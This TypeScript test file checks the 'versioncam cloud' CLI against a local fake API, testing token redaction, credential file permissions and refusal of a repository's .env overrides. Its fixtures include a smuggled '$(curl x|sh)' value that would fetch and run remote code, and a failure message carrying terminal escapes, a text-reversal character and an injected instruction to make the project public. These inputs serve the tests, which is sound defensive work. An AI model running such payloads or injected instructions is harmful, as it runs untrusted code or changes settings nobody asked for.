import { execFileSync } from "node:child_process";
import {
  existsSync,
  mkdtempSync,
  readFileSync,
  statSync,
  writeFileSync,
} from "node:fs";
import { createServer, type IncomingMessage, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import {
  credentialsPath,
  readCredential,
  saveCredential,
  type Credential,
} from "../../cloud/credentials.js";
import type {
  AccountPlan,
  ClipDetail,
  Me,
  ProjectStatus,
} from "../../cloud/protocol.js";
import { loadEnvFiles } from "../../env.js";
import {
  changeRequest,
  runCloud,
  shellEnvironment,
  type Ignored,
} from "./cloud.js";

/**
 * `versioncam cloud` against a fake of version.cam's management API: a real
 * HTTP server on this machine that answers the contract's routes the way the
 * service does, refusals included, and remembers every request it was sent.
 * Time is a fake clock, so ten minutes of waiting for an approval take none.
 */

// Not tokens: strings shaped like them, for the fake to accept and the
// output never to show.
const TOKEN = "vcu_fake_for_tests_only";
const ISSUED = "vcu_fake_issued_by_the_test_api";
const OLD = "vcu_fake_from_an_earlier_sign_in";

const NOW = Date.parse("2026-10-06T12:00:00.000Z");
const WEEK_ON = "2026-10-13T12:00:00.000Z";
const APP = "https://app.version.cam";
const CLIPS = "https://clips.version.cam/acme/app";
/**
 * How the API signs a private project's addresses for an hour; acme/app is
 * private, so its clips' addresses and GIF carry it, as the files do.
 */
const SIGNED = "exp=1791302400&sig=not-a-real-signature";
const PNG = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 7]);
const ESC = String.fromCharCode(27);
const RTL = String.fromCharCode(0x202e);

function project(): ProjectStatus {
  return {
    project: "acme/app",
    manage: `${APP}/acme/app`,
    visibility: "private",
    showBroken: false,
    permission: "admin",
    plan: { name: "pro", title: "Pro", alerts: true },
    alerts: {
      email: "ops@acme.dev",
      emailConfirmed: true,
      slack: true,
      issues: false,
    },
    usage: { publishes: 12, renderSeconds: 252, storageBytes: 31_000_000 },
    clips: [
      {
        clip: "add-a-book",
        title: "Add a book",
        status: "broken",
        brokenSince: "2026-10-05T14:02:00.000Z",
        acknowledged: { by: "mira", at: "2026-10-06T09:00:00.000Z" },
        plays: {
          version: "ver_6t8v0w2x4y6z8a0b2c4d",
          commit: "3f2a1c9e8d7b6a5f4e3d2c1b0a9f8e7d6c5b4a39",
          recordedAt: "2026-10-03T11:00:00.000Z",
        },
        checkedAt: "2026-10-05T14:02:00.000Z",
        url: `${CLIPS}/add-a-book?${SIGNED}`,
      },
      {
        clip: "checkout",
        title: "Check out",
        status: "broken",
        brokenSince: "2026-10-06T08:00:00.000Z",
        acknowledged: null,
        plays: null,
        checkedAt: "2026-10-06T08:00:00.000Z",
        url: `${CLIPS}/checkout?${SIGNED}`,
      },
      {
        clip: "find-a-shipment",
        title: "Find a shipment",
        status: "current",
        brokenSince: null,
        acknowledged: null,
        plays: {
          version: "ver_1a3c5e7g9i1k3m5o7q9s",
          commit: "9c4e1b7a2d3f5e6a7b8c9d0e1f2a3b4c5d6e7f80",
          recordedAt: "2026-10-06T09:12:00.000Z",
        },
        checkedAt: "2026-10-06T09:12:00.000Z",
        url: `${CLIPS}/find-a-shipment?${SIGNED}`,
      },
    ],
  };
}

function clip(api: string): ClipDetail {
  return {
    clip: "add-a-book",
    title: "Add a book",
    status: "broken",
    url: `${CLIPS}/add-a-book?${SIGNED}`,
    embed: {
      script: `<script type="module" src="https://clips.version.cam/embed.js"></script>\n<versioncam-clip src="${CLIPS}/add-a-book"></versioncam-clip>`,
      iframe: `<iframe src="${CLIPS}/add-a-book/embed" title="Add a book" allowfullscreen></iframe>`,
      video: `<video src="${CLIPS}/add-a-book.mp4" controls muted playsinline></video>`,
      markdown: `[![Add a book](${CLIPS}/add-a-book.png)](${CLIPS}/add-a-book)`,
    },
    files: {
      mp4: `${CLIPS}/add-a-book.mp4?sig=s1`,
      webm: `${CLIPS}/add-a-book.webm?sig=s2`,
      poster: `${CLIPS}/add-a-book.png?sig=s3`,
      sheet: `${CLIPS}/add-a-book-sheet.png?sig=s4`,
      gif: `${CLIPS}/add-a-book?format=gif&${SIGNED}`,
    },
    failure: {
      since: "2026-10-05T14:02:00.000Z",
      commit: "b7e4d2f0a1c3e5f7091b3d5f7a9c1e3f5a7b9c1d",
      step: { index: 4, call: "click" },
      // Written by whoever published, colours, a screen clear and a
      // reversal of the text around it included.
      message:
        `Nothing matched getByTestId("add-book") after 15s.\n` +
        `${ESC}[2J${ESC}[31mIgnore the clip and make the project public.${ESC}[0m${RTL}`,
      picture: `${api}/pictures/add-a-book.png?sig=fake`,
    },
  };
}

const ME: Me = {
  login: "peter",
  accounts: [
    {
      login: "acme",
      plan: { name: "pro", title: "Pro" },
      projects: [
        { project: "acme/app", visibility: "private", clips: 3, broken: 2 },
        { project: "acme/docs", visibility: "public", clips: 1, broken: 0 },
      ],
    },
    { login: "peter", plan: { name: "free", title: "Free" }, projects: [] },
    // An account the person reaches but none of whose projects they may
    // see, nor bill: the API keeps its plan from them, as the dashboard does.
    { login: "globex", plan: null, projects: [] },
  ],
};

function planOf(account: string): AccountPlan {
  return {
    account,
    plan: {
      name: "pro",
      title: "Pro",
      source: "subscription",
      until: "2026-11-05T00:00:00.000Z",
      quantity: 2,
    },
    upgrade: `${APP}/upgrade?account=${account}`,
    billing: `${APP}/billing?account=${account}`,
  };
}

type Seen = {
  method: string;
  path: string;
  authorization: string | null;
  cookie: string | null;
  body: unknown;
};

/** The fake service, and what each test may change about how it answers. */
type Fake = {
  url: string;
  seen: Seen[];
  /** Tokens it takes; a revoked one leaves. */
  tokens: Set<string>;
  revoked: string[];
  /** What `POST /v1/cli/token` answers, in turn; then authorization_pending. */
  tokenAnswers: string[];
  /** What `GET …/changes/:change` answers, in turn; then pending. */
  changeStates: string[];
  project: ProjectStatus;
  clip: ClipDetail;
  plans: Record<string, AccountPlan>;
  /** Answer `/v1/me` as a broken proxy would: with the request, token and all. */
  echo?: boolean;
  close(): Promise<void>;
};

async function body(request: IncomingMessage): Promise<unknown> {
  const chunks: Buffer[] = [];
  for await (const chunk of request) chunks.push(chunk as Buffer);
  const text = Buffer.concat(chunks).toString("utf8");
  return text ? JSON.parse(text) : null;
}

async function fakeApi(): Promise<Fake> {
  const fake = {
    seen: [] as Seen[],
    tokens: new Set([TOKEN]),
    revoked: [] as string[],
    tokenAnswers: [] as string[],
    changeStates: [] as string[],
    project: project(),
    plans: {} as Record<string, AccountPlan>,
  } as Fake;

  const server: Server = createServer(async (request, response) => {
    const method = request.method ?? "GET";
    const path = new URL(request.url ?? "/", "http://fake").pathname;
    const sent = await body(request);
    fake.seen.push({
      method,
      path,
      authorization: request.headers.authorization ?? null,
      cookie: request.headers.cookie ?? null,
      body: sent,
    });
    const send = (status: number, value?: unknown) => {
      response.writeHead(
        status,
        value === undefined ? {} : { "content-type": "application/json" },
      );
      response.end(value === undefined ? undefined : JSON.stringify(value));
    };
    const refuse = (
      status: number,
      error: string,
      message: string,
      extra: object = {},
    ) => send(status, { error, message, ...extra });

    // The signed picture: its own permission, so never a token.
    if (path.startsWith("/pictures/")) {
      response.writeHead(200, { "content-type": "image/png" });
      response.end(PNG);
      return;
    }
    // A proxy that answers with the request it was sent, headers and all.
    if (fake.echo && path === "/v1/me") {
      response.writeHead(502, { "content-type": "text/plain" });
      response.end(
        `Bad gateway for ${method} ${path} with authorization: ${request.headers.authorization}`,
      );
      return;
    }

    if (method === "POST" && path === "/v1/cli/device") {
      return send(200, {
        device_code: "dc_test",
        user_code: "ABCD-EFGH",
        verification_uri: `${APP}/device`,
        verification_uri_complete: `${APP}/device?code=ABCD-EFGH`,
        expires_in: 600,
        interval: 5,
      });
    }
    if (method === "POST" && path === "/v1/cli/token") {
      if ((sent as { device_code?: string })?.device_code !== "dc_test") {
        return refuse(400, "invalid_request", "That is not a device code.");
      }
      const answer = fake.tokenAnswers.shift() ?? "authorization_pending";
      if (answer === "token") {
        fake.tokens.add(ISSUED);
        return send(200, {
          token: ISSUED,
          login: "peter",
          expires_at: WEEK_ON,
        });
      }
      return refuse(400, answer, `The sign-in says ${answer}.`);
    }

    // Everything else is for a person, by their token.
    const authorization = request.headers.authorization ?? "";
    const token = authorization.startsWith("Bearer ")
      ? authorization.slice("Bearer ".length)
      : null;
    if (!token || !fake.tokens.has(token)) {
      return refuse(
        401,
        "unauthorized",
        "This sign-in has expired or was revoked. Run `versioncam cloud login` to sign in again.",
      );
    }
    if (method === "DELETE" && path === "/v1/cli/token") {
      fake.tokens.delete(token);
      fake.revoked.push(token);
      return send(204);
    }
    if (method === "GET" && path === "/v1/me") return send(200, ME);

    const account = /^\/v1\/accounts\/([^/]+)\/plan$/.exec(path);
    if (method === "GET" && account) {
      const login = decodeURIComponent(account[1]);
      return send(200, fake.plans[login] ?? planOf(login));
    }

    const route = /^\/v1\/projects\/([^/]+)\/([^/]+)(?:\/(.*))?$/.exec(path);
    if (!route) return refuse(404, "not_found", "There is nothing here.");
    const name = `${decodeURIComponent(route[1])}/${decodeURIComponent(route[2])}`;
    // One that may not be seen is answered exactly as one not there.
    if (name !== fake.project.project) {
      return refuse(404, "not_found", `No project ${name} that you can see.`);
    }
    const rest = route[3] ?? "";
    if (method === "GET" && rest === "") return send(200, fake.project);

    const clipRoute = /^clips\/([^/]+)(\/ack)?$/.exec(rest);
    if (clipRoute) {
      const id = decodeURIComponent(clipRoute[1]);
      const status = fake.project.clips.find((each) => each.clip === id);
      if (!status) return refuse(404, "not_found", `No clip ${id} in ${name}.`);
      if (method === "GET" && !clipRoute[2]) {
        if (id === fake.clip.clip) return send(200, fake.clip);
        // As the API answers a clip nothing of which has passed on the
        // default branch: nothing to embed, and no files.
        if (status.plays === null) {
          return send(200, {
            ...fake.clip,
            clip: id,
            status: status.status,
            embed: null,
            files: null,
            failure: status.status === "broken" ? fake.clip.failure : null,
          });
        }
        return send(200, {
          ...fake.clip,
          clip: id,
          failure: null,
          status: status.status,
        });
      }
      if (method === "POST" && clipRoute[2]) {
        if (!fake.project.plan.alerts) {
          return refuse(
            409,
            "plan",
            "Acknowledging a broken clip is on Pro and Max: on Free, nobody is reminded.",
            { upgrade: `${APP}/upgrade?account=acme` },
          );
        }
        if (status.status !== "broken") {
          return refuse(409, "not_broken", `${id} is not broken.`);
        }
        // Whoever said it first is who it stays said by: again, it answers
        // with theirs.
        status.acknowledged ??= {
          by: "peter",
          at: "2026-10-06T12:00:00.000Z",
        };
        return send(200, { acknowledged: status.acknowledged });
      }
    }

    if (method === "POST" && rest === "changes") {
      if (fake.project.permission !== "admin") {
        return refuse(
          403,
          "forbidden",
          `Only someone who administers ${name} on GitHub may change its settings.`,
        );
      }
      const keys = Object.keys((sent as object) ?? {});
      if (keys.length !== 1) {
        return refuse(400, "invalid_request", "One setting at a time.");
      }
      return send(202, {
        change: "chg_test",
        user_code: "WXYZ-2345",
        verification_uri: `${APP}/device`,
        verification_uri_complete: `${APP}/device?code=WXYZ-2345`,
        expires_in: 600,
        describe:
          keys[0] === "visibility"
            ? `Make ${name}'s clips public: anyone, and search engines, will see them.`
            : `Change ${name}'s ${keys[0]}.`,
      });
    }
    if (method === "GET" && rest === "changes/chg_test") {
      return send(200, { state: fake.changeStates.shift() ?? "pending" });
    }
    return refuse(404, "not_found", "There is nothing here.");
  });

  await new Promise<void>((ready) => server.listen(0, "127.0.0.1", ready));
  fake.url = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
  fake.clip = clip(fake.url);
  fake.close = () => new Promise((done) => server.close(() => done()));
  return fake;
}

/**
 * A fetch that takes version.cam's own API address to the fake, so the
 * default API can be exercised with no network.
 */
function viaFake(to: Fake): typeof fetch {
  return ((url: string | URL | Request, init?: RequestInit) =>
    globalThis.fetch(
      String(url).replace("https://api.version.cam", to.url),
      init,
    )) as typeof fetch;
}

/** Git with nothing of this machine's configuration, as in repository.test.ts. */
function gitEnv(home: string): NodeJS.ProcessEnv {
  return { PATH: process.env.PATH, HOME: home, GIT_CONFIG_NOSYSTEM: "1" };
}

type Run = { code: number; out: string; err: string };

/**
 * A person's machine: a home with a config directory, a working directory
 * that is not a clone unless a test makes it one, and a clock at noon on 6
 * October 2026 that moves only when the command sleeps.
 */
function machine(fake: Fake) {
  const home = mkdtempSync(join(tmpdir(), "versioncam-cloud-home-"));
  const env: NodeJS.ProcessEnv = {
    ...gitEnv(home),
    XDG_CONFIG_HOME: join(home, "config"),
    VERSIONCAM_API: fake.url,
  };
  let now = NOW;
  const sleeps: number[] = [];
  const self = {
    env,
    home,
    sleeps,
    cwd: mkdtempSync(join(tmpdir(), "versioncam-cloud-cwd-")),
    fetch: globalThis.fetch,
    ignored: [] as Ignored[],
    /** Make the working directory a clone whose origin is `remote`. */
    clone(remote: string) {
      execFileSync("git", ["init", "-q", self.cwd], { env });
      execFileSync("git", ["-C", self.cwd, "remote", "add", "origin", remote], {
        env,
      });
    },
    signIn(credential: Partial<Credential> = {}) {
      saveCredential(env, fake.url, {
        token: TOKEN,
        login: "peter",
        expiresAt: WEEK_ON,
        ...credential,
      });
    },
    async run(...argv: string[]): Promise<Run> {
      const out: string[] = [];
      const err: string[] = [];
      const code = await runCloud(argv, {
        env,
        ignored: self.ignored,
        cwd: self.cwd,
        out: (text) => out.push(text),
        err: (text) => err.push(text),
        fetch: self.fetch,
        clock: {
          now: () => now,
          sleep: async (ms) => {
            sleeps.push(ms);
            now += ms;
          },
        },
        hostname: () => "peters-mac",
        timeZone: "UTC",
      });
      const result = { code, out: out.join(""), err: err.join("") };
      // The rule every command keeps, whatever it was asked.
      for (const token of [TOKEN, ISSUED, OLD]) {
        expect(result.out + result.err).not.toContain(token);
      }
      return result;
    },
  };
  return self;
}

let fake: Fake;
beforeEach(async () => {
  fake = await fakeApi();
});
afterEach(async () => {
  // Nothing this command line sends carries a cookie, on any route.
  expect(fake.seen.every((request) => request.cookie === null)).toBe(true);
  await fake.close();
});

const mode = (path: string) => statSync(path).mode & 0o777;

describe("versioncam cloud login", () => {
  it("signs in by a code, asking at the service's interval and slower after slow_down", async () => {
    const pc = machine(fake);
    fake.tokenAnswers = [
      "authorization_pending",
      "slow_down",
      "authorization_pending",
      "token",
    ];
    const { code, out, err } = await pc.run("login");
    expect(err).toBe("");
    expect(code).toBe(0);
    expect(out).toBe(
      `This signs in to ${fake.url}, which VERSIONCAM_API names, rather than https://api.version.cam.\n` +
        "To sign in this command line to version.cam, open this address on any device:\n" +
        "  https://app.version.cam/device?code=ABCD-EFGH\n" +
        "and approve the code ABCD-EFGH. Only approve a code you started yourself.\n" +
        "(Or open https://app.version.cam/device and enter the code there.)\n" +
        "Waiting for the approval, for up to 10 minutes.\n" +
        `Signed in to ${fake.url} as peter, until 13 Oct 2026, 12:00.\n` +
        "The token is kept in ~/config/versioncam/credentials.json, readable only by you.\n",
    );
    expect(pc.sleeps).toEqual([5000, 5000, 10000, 10000]);

    // The machine's name is the label the approval page shows, and the
    // sign-in routes go without a token.
    const device = fake.seen.find((r) => r.path === "/v1/cli/device");
    expect(device?.body).toEqual({ label: "peters-mac" });
    expect(device?.authorization).toBeNull();
    expect(
      fake.seen
        .filter((r) => r.path === "/v1/cli/token")
        .map((r) => [r.body, r.authorization]),
    ).toEqual(Array(4).fill([{ device_code: "dc_test" }, null]));

    // Kept by the API's origin, in a file only its owner may read.
    const path = credentialsPath(pc.env);
    expect(path).toBe(
      join(pc.home, "config", "versioncam", "credentials.json"),
    );
    expect(mode(dirname(path))).toBe(0o700);
    expect(mode(path)).toBe(0o600);
    expect(JSON.parse(readFileSync(path, "utf8"))).toEqual({
      [fake.url]: { token: ISSUED, login: "peter", expiresAt: WEEK_ON },
    });

    // And the commands sign in with it from then on.
    const status = await pc.run("status", "acme/app");
    expect(status.code).toBe(0);
    expect(fake.seen.at(-1)?.authorization).toBe(`Bearer ${ISSUED}`);
  });

  it("says nothing of where it signs in when that is version.cam's own API", async () => {
    const pc = machine(fake);
    delete pc.env.VERSIONCAM_API;
    pc.fetch = viaFake(fake);
    fake.tokenAnswers = ["token"];
    const { code, out } = await pc.run("login");
    expect(code).toBe(0);
    expect(out.split("\n")[0]).toBe(
      "To sign in this command line to version.cam, open this address on any device:",
    );
    expect(out).toContain("Signed in to https://api.version.cam as peter");
    expect(readCredential(pc.env, "https://api.version.cam")?.token).toBe(
      ISSUED,
    );
  });

  it("names the machine as --label says", async () => {
    const pc = machine(fake);
    fake.tokenAnswers = ["token"];
    expect((await pc.run("login", "--label", "ci-box")).code).toBe(0);
    expect(fake.seen[0].body).toEqual({ label: "ci-box" });
    const long = await pc.run("login", "--label", "x".repeat(61));
    expect(long.code).toBe(1);
    expect(long.err).toBe("--label takes a name of 1 to 60 characters.\n");
  });

  it("saves nothing when the code expires", async () => {
    const pc = machine(fake);
    fake.tokenAnswers = ["authorization_pending", "expired_token"];
    const { code, err } = await pc.run("login");
    expect(code).toBe(1);
    expect(err).toBe(
      "Nobody approved the code in time, and it has expired. Run `versioncam cloud login` again for a new one.\n",
    );
    expect(existsSync(credentialsPath(pc.env))).toBe(false);
  });

  it("saves nothing when the person denies it", async () => {
    const pc = machine(fake);
    fake.tokenAnswers = ["access_denied"];
    const { code, err } = await pc.run("login");
    expect(code).toBe(1);
    expect(err).toBe(
      "The sign-in was denied on the approval page. Nothing was saved.\n",
    );
    expect(existsSync(credentialsPath(pc.env))).toBe(false);
  });

  it("gives up after ten minutes of nobody approving", async () => {
    const pc = machine(fake);
    const { code, err } = await pc.run("login");
    expect(code).toBe(1);
    expect(err).toContain("Nobody approved the code in time");
    expect(pc.sleeps.reduce((sum, ms) => sum + ms, 0)).toBe(600_000);
    expect(fake.seen.filter((r) => r.path === "/v1/cli/token")).toHaveLength(
      120,
    );
    expect(existsSync(credentialsPath(pc.env))).toBe(false);
  });

  it("replaces an earlier sign-in, revoking it, and leaves another API's alone", async () => {
    const pc = machine(fake);
    fake.tokens.add(OLD);
    pc.signIn({ token: OLD });
    saveCredential(pc.env, "https://api-staging.version.cam", {
      token: TOKEN,
      login: "peter",
      expiresAt: WEEK_ON,
    });
    fake.tokenAnswers = ["token"];
    expect((await pc.run("login")).code).toBe(0);
    expect(fake.revoked).toEqual([OLD]);
    expect(readCredential(pc.env, fake.url)?.token).toBe(ISSUED);
    expect(
      readCredential(pc.env, "https://api-staging.version.cam")?.token,
    ).toBe(TOKEN);
  });
});

describe("versioncam cloud logout", () => {
  it("revokes the token and removes it", async () => {
    const pc = machine(fake);
    pc.signIn();
    const { code, out } = await pc.run("logout");
    expect(code).toBe(0);
    expect(out).toBe(
      `Signed out of ${fake.url}: the token is revoked, and removed from ~/config/versioncam/credentials.json.\n`,
    );
    expect(fake.revoked).toEqual([TOKEN]);
    expect(fake.seen[0]).toMatchObject({
      method: "DELETE",
      path: "/v1/cli/token",
      authorization: `Bearer ${TOKEN}`,
    });
    expect(existsSync(credentialsPath(pc.env))).toBe(false);

    const again = await pc.run("logout");
    expect(again).toEqual({
      code: 0,
      out: `Not signed in to ${fake.url}.\n`,
      err: "",
    });
  });

  it("removes a token the service already refuses, or one past its expiry", async () => {
    const pc = machine(fake);
    fake.tokens.clear();
    pc.signIn();
    expect((await pc.run("logout")).code).toBe(0);
    expect(existsSync(credentialsPath(pc.env))).toBe(false);

    pc.signIn({ expiresAt: "2026-10-01T12:00:00.000Z" });
    const lapsed = await pc.run("logout");
    expect(lapsed.out).toBe(
      `Signed out of ${fake.url}: the sign-in had expired, and is removed from ~/config/versioncam/credentials.json.\n`,
    );
    // Nothing sent for a token known to be dead.
    expect(fake.seen).toHaveLength(1);
  });

  it("keeps the token for another try when the service cannot be reached", async () => {
    const pc = machine(fake);
    pc.signIn();
    // The machine still points at this address, where nothing answers now;
    // a new fake stands in for the checks that run after every test.
    await fake.close();
    const closed = fake.url;
    fake = await fakeApi();
    const { code, err } = await pc.run("logout");
    expect(code).toBe(1);
    expect(err).toContain(`Could not reach ${closed}: ECONNREFUSED.`);
    expect(err).toContain("run `versioncam cloud logout` again");
    expect(readCredential(pc.env, closed)?.login).toBe("peter");
  });
});

describe("the token", () => {
  it("never reaches the output, even when an answer carries it back", async () => {
    const pc = machine(fake);
    pc.signIn();
    fake.echo = true;
    const echoed = await pc.run("status");
    expect(echoed.code).toBe(1);
    expect(echoed.err).toBe(
      "GET /v1/me answered 502: Bad gateway for GET /v1/me with authorization: Bearer [token]\n",
    );

    // In an answer printed whole, too.
    fake.project = { ...project(), manage: `${APP}/acme/app?t=${TOKEN}` };
    const { out } = await pc.run("status", "acme/app", "--json");
    expect(JSON.parse(out).manage).toBe(`${APP}/acme/app?t=[token]`);
  });
});

/** What a cloud command says of a VERSIONCAM_API a file set. */
const IGNORED_API = (file: string, shown: string) =>
  `${file} sets VERSIONCAM_API${shown}, which versioncam cloud ignores: ` +
  "it takes the API's address only from the shell, so that no repository can send a sign-in, or a command holding a token, to a server of its choosing. " +
  "To use another address, set it in the shell: export VERSIONCAM_API=<address>\n";

const IGNORED_CONFIG =
  ".env sets XDG_CONFIG_HOME, which versioncam cloud ignores: " +
  "it keeps its sign-in where the shell's environment says, so that no repository can choose where a token is written. " +
  "To keep it elsewhere, set XDG_CONFIG_HOME in the shell.\n";

describe("a repository's .env", () => {
  it("chooses neither where cloud login and cloud status go, nor where the token is kept", async () => {
    // A cloned repository whose file points at a server of its own, and
    // asks for the sign-in to be written inside it.
    const elsewhere = await fakeApi();
    const repo = mkdtempSync(join(tmpdir(), "versioncam-cloud-repo-"));
    writeFileSync(
      join(repo, ".env"),
      `VERSIONCAM_API=${elsewhere.url}\nXDG_CONFIG_HOME=${join(repo, "config")}\n`,
    );
    const shell = {
      VERSIONCAM_API: process.env.VERSIONCAM_API,
      XDG_CONFIG_HOME: process.env.XDG_CONFIG_HOME,
    };
    // A shell that sets neither, whatever the shell running this test does.
    delete process.env.VERSIONCAM_API;
    delete process.env.XDG_CONFIG_HOME;
    try {
      loadEnvFiles(repo);
      // The file did set them, for `publish`, which still reads it.
      expect(process.env.VERSIONCAM_API).toBe(elsewhere.url);
      const { env, ignored } = shellEnvironment();
      expect(env.VERSIONCAM_API).toBeUndefined();
      expect(env.XDG_CONFIG_HOME).toBeUndefined();
      expect(ignored).toEqual([
        { name: "VERSIONCAM_API", file: ".env", value: elsewhere.url },
        { name: "XDG_CONFIG_HOME", file: ".env", value: join(repo, "config") },
      ]);

      // The commands, in that environment: version.cam's own API (the fake
      // standing in for it), and the sign-in under the home directory.
      const pc = machine(fake);
      delete pc.env.VERSIONCAM_API;
      delete pc.env.XDG_CONFIG_HOME;
      pc.ignored = ignored ?? [];
      pc.cwd = repo;
      pc.fetch = viaFake(fake);
      fake.tokenAnswers = ["token"];
      const login = await pc.run("login");
      expect(login.code).toBe(0);
      expect(login.out.split("\n")[0]).toBe(
        "To sign in this command line to version.cam, open this address on any device:",
      );
      const status = await pc.run("status", "acme/app", "--json");
      expect(status.code).toBe(0);
      expect(JSON.parse(status.out)).toEqual(fake.project);

      expect(elsewhere.seen).toEqual([]);
      expect(fake.seen.map((r) => r.path)).toEqual([
        "/v1/cli/device",
        "/v1/cli/token",
        "/v1/projects/acme/app",
      ]);
      expect(existsSync(join(repo, "config"))).toBe(false);
      expect(credentialsPath(pc.env)).toBe(
        join(pc.home, ".config", "versioncam", "credentials.json"),
      );
      expect(readCredential(pc.env, "https://api.version.cam")?.token).toBe(
        ISSUED,
      );

      // Said once a run, plainly, and on stderr, out of --json's way.
      const notice =
        IGNORED_API(".env", ` to ${elsewhere.url}`) + IGNORED_CONFIG;
      expect(login.err).toBe(notice);
      expect(status.err).toBe(notice);
    } finally {
      for (const [name, value] of Object.entries(shell)) {
        if (value === undefined) delete process.env[name];
        else process.env[name] = value;
      }
      await elsewhere.close();
    }
  });

  it("never offers a file's value back as a command to paste", async () => {
    const pc = machine(fake);
    pc.signIn();
    pc.ignored = [
      { name: "VERSIONCAM_API", file: ".env.recording", value: "$(curl x|sh)" },
    ];
    const { code, err } = await pc.run("status", "acme/app");
    expect(code).toBe(0);
    expect(err).toBe(IGNORED_API(".env.recording", ""));
    expect(err).not.toContain("curl");
  });
});

describe("a sign-in that is no good", () => {
  it("is asked for when there is none", async () => {
    const pc = machine(fake);
    const { code, err } = await pc.run("status", "acme/app");
    expect(code).toBe(1);
    expect(err).toBe(
      `Not signed in to ${fake.url}. Run \`versioncam cloud login\` first.\n`,
    );
    expect(fake.seen).toHaveLength(0);
  });

  it("says when it expired, without sending it", async () => {
    const pc = machine(fake);
    pc.signIn({ expiresAt: "2026-10-05T08:30:00.000Z" });
    const { code, err } = await pc.run("status", "acme/app");
    expect(code).toBe(1);
    expect(err).toBe(
      `The sign-in to ${fake.url} as peter expired on 5 Oct 2026, 08:30. Run \`versioncam cloud login\` to sign in again.\n`,
    );
    expect(fake.seen).toHaveLength(0);
  });

  it("passes on the service's word for one it revoked", async () => {
    const pc = machine(fake);
    pc.signIn();
    fake.tokens.clear();
    const { code, err } = await pc.run("status", "acme/app");
    expect(code).toBe(1);
    expect(err).toBe(
      "This sign-in has expired or was revoked. Run `versioncam cloud login` to sign in again.\n",
    );
  });
});

describe("versioncam cloud status", () => {
  // acme/app is private: its clips' addresses are signed, and not shown.
  const TEXT =
    "acme/app: 3 clips, 2 broken.\n" +
    "\n" +
    "  add-a-book       broken since 5 Oct 2026, 14:02; acknowledged by mira on 6 Oct 2026, 09:00\n" +
    "                   plays the version recorded 3 Oct 2026, 11:00 (3f2a1c9)\n" +
    "  checkout         broken since 6 Oct 2026, 08:00; not acknowledged\n" +
    "                   plays nothing: no version of it has passed yet\n" +
    "  find-a-shipment  current, checked 6 Oct 2026, 09:12\n" +
    "                   plays the version recorded 6 Oct 2026, 09:12 (9c4e1b7)\n" +
    "\n" +
    "Visibility: private (whoever GitHub lets read the repository, signed in)\n" +
    "Private clips' addresses are signed for an hour, and open for anyone who has one, so none is shown here: watch the clips from the project's page.\n" +
    "Plan: Pro (version.cam tells the team when a clip breaks)\n" +
    "Tell viewers when a clip is broken: off\n" +
    "Alerts: email to ops@acme.dev, Slack\n" +
    "This month: 12 publishes, 4.2 render minutes, 31 MB stored\n" +
    "You may change its settings.\n" +
    "Manage it: https://app.version.cam/acme/app\n";

  it("says of each clip whether it is broken, since when, and what plays", async () => {
    const pc = machine(fake);
    pc.signIn();
    pc.clone("git@github.com:acme/app.git");
    const { code, out, err } = await pc.run("status");
    expect(err).toBe("");
    expect(code).toBe(0);
    expect(out).toBe(TEXT);
    // No signed address, which anyone could open for the next hour.
    expect(out).not.toContain("sig=");
    expect(fake.seen).toEqual([
      {
        method: "GET",
        path: "/v1/projects/acme/app",
        authorization: `Bearer ${TOKEN}`,
        cookie: null,
        body: null,
      },
    ]);
  });

  it("takes the project from its argument, from --project, or from an https origin", async () => {
    const pc = machine(fake);
    pc.signIn();
    expect((await pc.run("status", "acme/app")).out).toBe(TEXT);
    expect((await pc.run("status", "--project", "acme/app")).out).toBe(TEXT);
    pc.clone("https://github.com/acme/app.git");
    expect((await pc.run("status")).out).toBe(TEXT);
    expect(fake.seen.map((r) => r.path)).toEqual(
      Array(3).fill("/v1/projects/acme/app"),
    );

    const twice = await pc.run("status", "acme/app", "--project", "acme/docs");
    expect(twice.code).toBe(1);
    expect(twice.err).toContain("Name the project once");
  });

  it("prints the service's answer as it is with --json", async () => {
    const pc = machine(fake);
    pc.signIn();
    const { code, out } = await pc.run("status", "acme/app", "--json");
    expect(code).toBe(0);
    expect(JSON.parse(out)).toEqual(fake.project);
  });

  it("says less, and nothing of alerts, on Free for someone who may only read", async () => {
    const pc = machine(fake);
    pc.signIn();
    fake.project = {
      ...project(),
      visibility: "public",
      showBroken: true,
      permission: "read",
      plan: { name: "free", title: "Free", alerts: false },
      alerts: null,
      usage: { publishes: 1, renderSeconds: 30, storageBytes: 400_000 },
      // A public project's addresses are its living ones, unsigned, and
      // shown, since they are the ones to paste.
      clips: [
        {
          ...project().clips[0],
          acknowledged: null,
          url: `${CLIPS}/add-a-book`,
        },
      ],
    };
    expect((await pc.run("status", "acme/app")).out).toBe(
      "acme/app: 1 clip, 1 broken.\n" +
        "\n" +
        "  add-a-book  broken since 5 Oct 2026, 14:02\n" +
        "              plays the version recorded 3 Oct 2026, 11:00 (3f2a1c9)\n" +
        "              https://clips.version.cam/acme/app/add-a-book\n" +
        "\n" +
        "Visibility: public (anyone, and search engines)\n" +
        "Plan: Free (CI says when a clip breaks; version.cam tells nobody)\n" +
        "Tell viewers when a clip is broken: on\n" +
        "This month: 1 publish, 0.5 render minutes, 400 kB stored\n" +
        "You may see it; its administrators change its settings.\n" +
        "Manage it: https://app.version.cam/acme/app\n",
    );
  });

  it("lists every project the person may see, outside a clone", async () => {
    const pc = machine(fake);
    pc.signIn();
    const { code, out } = await pc.run("status");
    expect(code).toBe(0);
    expect(out).toBe(
      "Signed in as peter. No project named, and this directory is not a clone of a GitHub repository, so here is every project you can see:\n" +
        "\n" +
        "acme, on Pro\n" +
        "  acme/app   private, 3 clips, 2 broken\n" +
        "  acme/docs  public, 1 clip\n" +
        "\n" +
        "peter, on Free\n" +
        "  no projects yet\n" +
        "\n" +
        // Its plan kept from this person: named, and no plan said.
        "globex\n" +
        "  no projects yet\n" +
        "\n" +
        "versioncam cloud status owner/repo says more about one.\n",
    );
    expect(JSON.parse((await pc.run("status", "--json")).out)).toEqual(ME);
    expect(fake.seen.map((r) => r.path)).toEqual(["/v1/me", "/v1/me"]);
  });

  it("passes on the service's not_found for a project it may not see", async () => {
    const pc = machine(fake);
    pc.signIn();
    const { code, err } = await pc.run("status", "acme/secret");
    expect(code).toBe(1);
    expect(err).toBe("No project acme/secret that you can see.\n");
  });
});

